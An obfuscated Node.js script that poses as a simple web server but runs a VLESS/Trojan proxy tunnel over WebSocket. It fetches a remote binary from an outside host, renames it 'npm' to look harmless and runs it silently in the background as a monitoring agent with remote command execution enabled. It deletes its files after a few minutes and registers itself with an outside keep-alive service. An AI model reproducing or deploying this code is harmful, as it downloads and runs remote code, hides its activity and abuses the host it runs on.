const _0x182782=_0x5592;(function(_0x3a494,_0x5a4f24){const _0x43da77=_0x5592,_0x1a2186=_0x3a494();while(!![]){try{const _0xcc5006=-parseInt(_0x43da77(0x1c5))/0x1+parseInt(_0x43da77(0x207))/0x2*(parseInt(_0x43da77(0x1e1))/0x3)+-parseInt(_0x43da77(0x1bf))/0x4*(-parseInt(_0x43da77(0x1cb))/0x5)+parseInt(_0x43da77(0x1f7))/0x6*(parseInt(_0x43da77(0x1cf))/0x7)+parseInt(_0x43da77(0x1a1))/0x8+-parseInt(_0x43da77(0x1fc))/0x9*(-parseInt(_0x43da77(0x1b2))/0xa)+parseInt(_0x43da77(0x1f4))/0xb*(-parseInt(_0x43da77(0x208))/0xc);if(_0xcc5006===_0x5a4f24)break;else _0x1a2186['push'](_0x1a2186['shift']());}catch(_0x2ccf84){_0x1a2186['push'](_0x1a2186['shift']());}}}(_0x161a,0xa81e9));const os=require('os'),http=require(_0x182782(0x1d7)),fs=require('fs'),axios=require(_0x182782(0x202)),net=require(_0x182782(0x210)),path=require(_0x182782(0x1aa)),crypto=require(_0x182782(0x1c8)),{Buffer}=require(_0x182782(0x1e2)),{exec,execSync}=require(_0x182782(0x20b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x182782(0x219)][_0x182782(0x1be)]||_0x182782(0x1b1),NEZHA_SERVER=process[_0x182782(0x219)][_0x182782(0x215)]||'',NEZHA_PORT=process[_0x182782(0x219)][_0x182782(0x1f0)]||'',NEZHA_KEY=process[_0x182782(0x219)][_0x182782(0x1e3)]||'',DOMAIN=process[_0x182782(0x219)][_0x182782(0x218)]||_0x182782(0x1e6),AUTO_ACCESS=process[_0x182782(0x219)]['AUTO_ACCESS']||![],WSPATH=process[_0x182782(0x219)][_0x182782(0x1a5)]||UUID[_0x182782(0x1ba)](0x0,0x8),SUB_PATH=process[_0x182782(0x219)]['SUB_PATH']||_0x182782(0x1a6),NAME=process[_0x182782(0x219)][_0x182782(0x214)]||'',PORT=process[_0x182782(0x219)][_0x182782(0x1d9)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x493406=_0x182782;try{const _0x29ecc3=await axios[_0x493406(0x205)]('https://api.ip.sb/geoip'),_0x4006c9=_0x29ecc3[_0x493406(0x1bb)];ISP=(_0x4006c9[_0x493406(0x1ec)]+'-'+_0x4006c9[_0x493406(0x1ff)])[_0x493406(0x20e)](/ /g,'_');}catch(_0x41a819){ISP=_0x493406(0x1c2);}};GetISP();const httpServer=http[_0x182782(0x217)]((_0x5b642c,_0x131156)=>{const _0x1947c6=_0x182782;if(_0x5b642c['url']==='/'){const _0x5d2fd0=path[_0x1947c6(0x1a9)](__dirname,_0x1947c6(0x1d5));fs[_0x1947c6(0x20c)](_0x5d2fd0,'utf8',(_0x276a12,_0x374466)=>{const _0x4cf951=_0x1947c6;if(_0x276a12){_0x131156['writeHead'](0xc8,{'Content-Type':_0x4cf951(0x1ca)}),_0x131156[_0x4cf951(0x1dc)](_0x4cf951(0x1cc));return;}_0x131156[_0x4cf951(0x1ef)](0xc8,{'Content-Type':_0x4cf951(0x1ca)}),_0x131156[_0x4cf951(0x1dc)](_0x374466);});return;}else{if(_0x5b642c[_0x1947c6(0x1bd)]==='/'+SUB_PATH){const _0x5ad8ce=NAME?NAME+'-'+ISP:ISP,_0x3ba134=_0x1947c6(0x1c4)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x1947c6(0x1df)+DOMAIN+_0x1947c6(0x20d)+WSPATH+'#'+_0x5ad8ce,_0x53ced2='trojan://'+UUID+_0x1947c6(0x1e9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5ad8ce,_0x5e8fac=_0x3ba134+'\x0a'+_0x53ced2,_0x178bec=Buffer[_0x1947c6(0x1ab)](_0x5e8fac)[_0x1947c6(0x1eb)](_0x1947c6(0x1f1));_0x131156['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x131156[_0x1947c6(0x1dc)](_0x178bec+'\x0a');}else _0x131156[_0x1947c6(0x1ef)](0x194,{'Content-Type':_0x1947c6(0x213)}),_0x131156['end'](_0x1947c6(0x1ed));}}),wss=new WebSocket[(_0x182782(0x20f))]({'server':httpServer}),uuid=UUID[_0x182782(0x20e)](/-/g,''),DNS_SERVERS=[_0x182782(0x1c6),'1.1.1.1'];function resolveHost(_0x569462){return new Promise((_0x1c75f1,_0xecd10e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x569462)){_0x1c75f1(_0x569462);return;}let _0x25209e=0x0;function _0x35512c(){const _0x270e4a=_0x5592;if(_0x25209e>=DNS_SERVERS['length']){_0xecd10e(new Error('Failed\x20to\x20resolve\x20'+_0x569462+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3d160e=DNS_SERVERS[_0x25209e];_0x25209e++;const _0x3bf5fb=_0x270e4a(0x209)+encodeURIComponent(_0x569462)+_0x270e4a(0x1d3);axios['get'](_0x3bf5fb,{'timeout':0x1388,'headers':{'Accept':_0x270e4a(0x1c0)}})[_0x270e4a(0x1f6)](_0x22afb7=>{const _0x88bdfe=_0x270e4a,_0xe1e494=_0x22afb7[_0x88bdfe(0x1bb)];if(_0xe1e494['Status']===0x0&&_0xe1e494[_0x88bdfe(0x203)]&&_0xe1e494[_0x88bdfe(0x203)]['length']>0x0){const _0x400a8c=_0xe1e494[_0x88bdfe(0x203)][_0x88bdfe(0x1ee)](_0x5d03c1=>_0x5d03c1[_0x88bdfe(0x1e0)]===0x1);if(_0x400a8c){_0x1c75f1(_0x400a8c[_0x88bdfe(0x1bb)]);return;}}_0x35512c();})[_0x270e4a(0x1cd)](_0x3d66d5=>{_0x35512c();});}_0x35512c();});}function _0x161a(){const _0x3f8ff7=['error:\x20','@cdns.doon.eu.org:443?security=tls&sni=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','toString','country_code','Not\x20Found\x0a','find','writeHead','NEZHA_PORT','base64','concat','443','2794LuRKCZ','8443','then','6aPSagN','update','createHash','pipe','arm64','18CVaifO','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20-p\x20','isp','https://amd64.ssss.nyc.mn/agent','2087','axios','Answer','createWriteStream','get','split','795754sWPTtr','71856MMWzaM','https://dns.google/resolve?name=','readUInt8','child_process','readFile','&path=%2F','replace','Server','net','finish','substr','text/plain','NAME','NEZHA_SERVER','https://oooo.serv00.net/add-url','createServer','DOMAIN','env','1397832aPFJzX','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','write','https://','WSPATH','sub','https://arm64.ssss.nyc.mn/agent','length','join','path','from','trim','false','client_secret:\x20','log','application/json','effc6803-c774-4c5d-b09e-6209ff2479fe','3207470CEjFRY','every','config.yaml','https://amd64.ssss.nyc.mn/v1','2096','arch','includes','digest','slice','data','2053','url','UUID','8Bpjpsy','application/dns-json','decode','Unknown','readUInt16BE','vless://','462571yguein','8.8.4.4','map','crypto','listen','text/html','849985CTtojt','Hello\x20world!','catch','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2256044gsiLbG','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','close','&type=A','hex','index.html','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','http','stream','PORT','unlink','2083','end','connect','setsid\x20nohup\x20./npm\x20-s\x20','&fp=chrome&type=ws&host=','type','9LeRipY','buffer','NEZHA_KEY','reduce','error','1234.abc.com','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'];_0x161a=function(){return _0x3f8ff7;};return _0x161a();}function _0x5592(_0x350697,_0x4b4777){_0x350697=_0x350697-0x1a1;const _0x161a2c=_0x161a();let _0x5592c1=_0x161a2c[_0x350697];return _0x5592c1;}function handleVlessConnection(_0x5baccf,_0x175510){const _0x5697f8=_0x182782,[_0x215095]=_0x175510,_0x335522=_0x175510[_0x5697f8(0x1ba)](0x1,0x11);if(!_0x335522['every']((_0x29a58f,_0x25f258)=>_0x29a58f==parseInt(uuid['substr'](_0x25f258*0x2,0x2),0x10)))return![];let _0x300518=_0x175510[_0x5697f8(0x1ba)](0x11,0x12)[_0x5697f8(0x20a)]()+0x13;const _0x23e93a=_0x175510['slice'](_0x300518,_0x300518+=0x2)[_0x5697f8(0x1c3)](0x0),_0x9509fc=_0x175510[_0x5697f8(0x1ba)](_0x300518,_0x300518+=0x1)[_0x5697f8(0x20a)](),_0x521876=_0x9509fc==0x1?_0x175510[_0x5697f8(0x1ba)](_0x300518,_0x300518+=0x4)[_0x5697f8(0x1a9)]('.'):_0x9509fc==0x2?new TextDecoder()[_0x5697f8(0x1c1)](_0x175510['slice'](_0x300518+0x1,_0x300518+=0x1+_0x175510[_0x5697f8(0x1ba)](_0x300518,_0x300518+0x1)[_0x5697f8(0x20a)]())):_0x9509fc==0x3?_0x175510[_0x5697f8(0x1ba)](_0x300518,_0x300518+=0x10)[_0x5697f8(0x1e4)]((_0x412a34,_0x148526,_0x258feb,_0x2b5388)=>_0x258feb%0x2?_0x412a34['concat'](_0x2b5388[_0x5697f8(0x1ba)](_0x258feb-0x1,_0x258feb+0x1)):_0x412a34,[])[_0x5697f8(0x1c7)](_0x1d0e8c=>_0x1d0e8c[_0x5697f8(0x1c3)](0x0)[_0x5697f8(0x1eb)](0x10))[_0x5697f8(0x1a9)](':'):'';_0x5baccf['send'](new Uint8Array([_0x215095,0x0]));const _0x46271f=createWebSocketStream(_0x5baccf);return resolveHost(_0x521876)[_0x5697f8(0x1f6)](_0x5b9da8=>{const _0x1432ee=_0x5697f8;net[_0x1432ee(0x1dd)]({'host':_0x5b9da8,'port':_0x23e93a},function(){const _0x4dee67=_0x1432ee;this['write'](_0x175510[_0x4dee67(0x1ba)](_0x300518)),_0x46271f['on'](_0x4dee67(0x1e5),()=>{})[_0x4dee67(0x1fa)](this)['on']('error',()=>{})[_0x4dee67(0x1fa)](_0x46271f);})['on']('error',()=>{});})[_0x5697f8(0x1cd)](_0x5db950=>{const _0x572c54=_0x5697f8;net[_0x572c54(0x1dd)]({'host':_0x521876,'port':_0x23e93a},function(){const _0x21db95=_0x572c54;this[_0x21db95(0x1a3)](_0x175510[_0x21db95(0x1ba)](_0x300518)),_0x46271f['on']('error',()=>{})[_0x21db95(0x1fa)](this)['on']('error',()=>{})[_0x21db95(0x1fa)](_0x46271f);})['on'](_0x572c54(0x1e5),()=>{});}),!![];}function handleTrojanConnection(_0x130f3a,_0xcddabf){const _0x28fbcd=_0x182782;try{if(_0xcddabf[_0x28fbcd(0x1a8)]<0x3a)return![];const _0x471224=_0xcddabf[_0x28fbcd(0x1ba)](0x0,0x38)[_0x28fbcd(0x1eb)](),_0x30ee38=[UUID];let _0x52176c=null;for(const _0x4ad86b of _0x30ee38){const _0x5f1d9a=crypto[_0x28fbcd(0x1f9)]('sha224')[_0x28fbcd(0x1f8)](_0x4ad86b)[_0x28fbcd(0x1b9)](_0x28fbcd(0x1d4));if(_0x5f1d9a===_0x471224){_0x52176c=_0x4ad86b;break;}}if(!_0x52176c)return![];let _0x21dc0=0x38;_0xcddabf[_0x21dc0]===0xd&&_0xcddabf[_0x21dc0+0x1]===0xa&&(_0x21dc0+=0x2);const _0x4e5b4e=_0xcddabf[_0x21dc0];if(_0x4e5b4e!==0x1)return![];_0x21dc0+=0x1;const _0x58cedd=_0xcddabf[_0x21dc0];_0x21dc0+=0x1;let _0x1d2e01,_0x552d87;if(_0x58cedd===0x1)_0x1d2e01=_0xcddabf[_0x28fbcd(0x1ba)](_0x21dc0,_0x21dc0+0x4)[_0x28fbcd(0x1a9)]('.'),_0x21dc0+=0x4;else{if(_0x58cedd===0x3){const _0x4a99cc=_0xcddabf[_0x21dc0];_0x21dc0+=0x1,_0x1d2e01=_0xcddabf[_0x28fbcd(0x1ba)](_0x21dc0,_0x21dc0+_0x4a99cc)['toString'](),_0x21dc0+=_0x4a99cc;}else{if(_0x58cedd===0x4)_0x1d2e01=_0xcddabf[_0x28fbcd(0x1ba)](_0x21dc0,_0x21dc0+0x10)[_0x28fbcd(0x1e4)]((_0x486f9e,_0x5a5864,_0x519e30,_0xf6f641)=>_0x519e30%0x2?_0x486f9e[_0x28fbcd(0x1f2)](_0xf6f641[_0x28fbcd(0x1ba)](_0x519e30-0x1,_0x519e30+0x1)):_0x486f9e,[])[_0x28fbcd(0x1c7)](_0x74c750=>_0x74c750['readUInt16BE'](0x0)[_0x28fbcd(0x1eb)](0x10))[_0x28fbcd(0x1a9)](':'),_0x21dc0+=0x10;else return![];}}_0x552d87=_0xcddabf[_0x28fbcd(0x1c3)](_0x21dc0),_0x21dc0+=0x2;_0x21dc0<_0xcddabf[_0x28fbcd(0x1a8)]&&_0xcddabf[_0x21dc0]===0xd&&_0xcddabf[_0x21dc0+0x1]===0xa&&(_0x21dc0+=0x2);const _0x110ab9=createWebSocketStream(_0x130f3a);return resolveHost(_0x1d2e01)[_0x28fbcd(0x1f6)](_0xe8f62a=>{const _0x5c58b3=_0x28fbcd;net[_0x5c58b3(0x1dd)]({'host':_0xe8f62a,'port':_0x552d87},function(){const _0x700b3c=_0x5c58b3;_0x21dc0<_0xcddabf[_0x700b3c(0x1a8)]&&this['write'](_0xcddabf[_0x700b3c(0x1ba)](_0x21dc0)),_0x110ab9['on'](_0x700b3c(0x1e5),()=>{})[_0x700b3c(0x1fa)](this)['on'](_0x700b3c(0x1e5),()=>{})['pipe'](_0x110ab9);})['on'](_0x5c58b3(0x1e5),()=>{});})[_0x28fbcd(0x1cd)](_0x5dcac6=>{const _0x59ff10=_0x28fbcd;net['connect']({'host':_0x1d2e01,'port':_0x552d87},function(){const _0x2a8650=_0x5592;_0x21dc0<_0xcddabf[_0x2a8650(0x1a8)]&&this[_0x2a8650(0x1a3)](_0xcddabf[_0x2a8650(0x1ba)](_0x21dc0)),_0x110ab9['on'](_0x2a8650(0x1e5),()=>{})[_0x2a8650(0x1fa)](this)['on']('error',()=>{})[_0x2a8650(0x1fa)](_0x110ab9);})['on'](_0x59ff10(0x1e5),()=>{});}),!![];}catch(_0x13864b){return![];}}wss['on']('connection',(_0x42df42,_0x3b2ba0)=>{const _0x2d6686=_0x182782,_0x130efc=_0x3b2ba0[_0x2d6686(0x1bd)]||'';_0x42df42['once']('message',_0x963501=>{const _0x822e7b=_0x2d6686;if(_0x963501['length']>0x11&&_0x963501[0x0]===0x0){const _0xc73650=_0x963501['slice'](0x1,0x11),_0x48ef75=_0xc73650[_0x822e7b(0x1b3)]((_0x280cd1,_0x26b9c3)=>_0x280cd1==parseInt(uuid[_0x822e7b(0x212)](_0x26b9c3*0x2,0x2),0x10));if(_0x48ef75){!handleVlessConnection(_0x42df42,_0x963501)&&_0x42df42[_0x822e7b(0x1d2)]();return;}}!handleTrojanConnection(_0x42df42,_0x963501)&&_0x42df42[_0x822e7b(0x1d2)]();})['on'](_0x2d6686(0x1e5),()=>{});});const getDownloadUrl=()=>{const _0xf4e7e9=_0x182782,_0x16110c=os[_0xf4e7e9(0x1b7)]();return _0x16110c==='arm'||_0x16110c===_0xf4e7e9(0x1fb)||_0x16110c==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xf4e7e9(0x1a7):!NEZHA_PORT?_0xf4e7e9(0x1b5):_0xf4e7e9(0x200);},downloadFile=async()=>{const _0x4a5cd4=_0x182782;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x596e89=getDownloadUrl(),_0xe84477=await axios({'method':_0x4a5cd4(0x205),'url':_0x596e89,'responseType':_0x4a5cd4(0x1d8)}),_0x2f8d3a=fs[_0x4a5cd4(0x204)]('npm');return _0xe84477['data'][_0x4a5cd4(0x1fa)](_0x2f8d3a),new Promise((_0x28224a,_0x5a88f3)=>{const _0x47b111=_0x4a5cd4;_0x2f8d3a['on'](_0x47b111(0x211),()=>{const _0x1c723e=_0x47b111;console[_0x1c723e(0x1af)](_0x1c723e(0x1d1)),exec('chmod\x20+x\x20npm',_0x1334a1=>{if(_0x1334a1)_0x5a88f3(_0x1334a1);_0x28224a();});}),_0x2f8d3a['on'](_0x47b111(0x1e5),_0x5a88f3);});}catch(_0xc67584){throw _0xc67584;}},runnz=async()=>{const _0x46b8f6=_0x182782;try{const _0x292a0c=execSync(_0x46b8f6(0x1fd),{'encoding':'utf-8'});if(_0x292a0c[_0x46b8f6(0x1ac)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x538382){}await downloadFile();let _0x483f02='',_0x50dde9=[_0x46b8f6(0x1f3),_0x46b8f6(0x1f5),_0x46b8f6(0x1b6),_0x46b8f6(0x201),_0x46b8f6(0x1db),_0x46b8f6(0x1bc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x13479c=_0x50dde9[_0x46b8f6(0x1b8)](NEZHA_PORT)?'--tls':'';_0x483f02=_0x46b8f6(0x1de)+NEZHA_SERVER+':'+NEZHA_PORT+_0x46b8f6(0x1fe)+NEZHA_KEY+'\x20'+_0x13479c+_0x46b8f6(0x1d6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4a040f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x46b8f6(0x206)](':')['pop']():'',_0x281c66=_0x50dde9[_0x46b8f6(0x1b8)](_0x4a040f)?'true':_0x46b8f6(0x1ad),_0x3aa92e=_0x46b8f6(0x1ae)+NEZHA_KEY+_0x46b8f6(0x1a2)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x281c66+_0x46b8f6(0x1e7)+UUID;fs['writeFileSync'](_0x46b8f6(0x1b4),_0x3aa92e);}_0x483f02=_0x46b8f6(0x1ce);}else{console[_0x46b8f6(0x1af)](_0x46b8f6(0x1ea));return;}}try{exec(_0x483f02,{'shell':'/bin/bash'},_0xa71818=>{const _0x18a3c7=_0x46b8f6;if(_0xa71818)console[_0x18a3c7(0x1e5)]('npm\x20running\x20error:',_0xa71818);else console[_0x18a3c7(0x1af)]('npm\x20is\x20running');});}catch(_0x597c54){console[_0x46b8f6(0x1e5)](_0x46b8f6(0x1e8)+_0x597c54);}};async function addAccessTask(){const _0x424fbf=_0x182782;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x516069=_0x424fbf(0x1a4)+DOMAIN+'/'+SUB_PATH;try{const _0x405ca7=await axios['post'](_0x424fbf(0x216),{'url':_0x516069},{'headers':{'Content-Type':_0x424fbf(0x1b0)}});console[_0x424fbf(0x1af)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5d1481){}}const delFiles=()=>{const _0x283f39=_0x182782;fs['unlink']('npm',()=>{}),fs[_0x283f39(0x1da)]('config.yaml',()=>{});};httpServer[_0x182782(0x1c9)](PORT,()=>{const _0x391c68=_0x182782;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x391c68(0x1d0)+PORT);});
